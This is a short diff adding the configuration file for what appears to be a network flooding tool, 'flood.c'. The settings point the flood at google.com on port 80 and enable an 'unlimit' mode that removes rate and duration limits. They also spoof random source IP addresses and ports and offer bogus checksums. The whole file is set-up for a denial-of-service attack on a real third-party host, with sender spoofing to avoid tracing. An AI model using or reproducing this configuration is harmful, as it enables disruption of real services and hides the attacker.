@@ -1,0 +1,22 @@
+/* configuration flood.c */
+
+target="google.com";		/* target for flood (dns or ipv4) */
+dstport=80;			/* dest port */
+method=0;			/* flood method */
+
+/* completely removes the <pps> and <time>
+ * restriction. allows you to achieve the
+ * highest speed */
+unlimit=1;
+
+/* random ip address of the sender, i.e.
+ * <ARAND>, can significantly speed up FLOOD.
+ * set to <NULL> if you want to use the real */
+source=ARAND;
+
+pps=100;			/* packet per second (disabled at unlimit) */
+time=5;				/* time for flood (in seconds) (disabled at unlimit) */
+interface=NULL;			/* your network interface (see <ip a>) */
+random=3;			/* random method (see log) */
+srcport=ARAND;			/* source port */
+badsum=0;			/* bogus checksum (no ip checksum) */
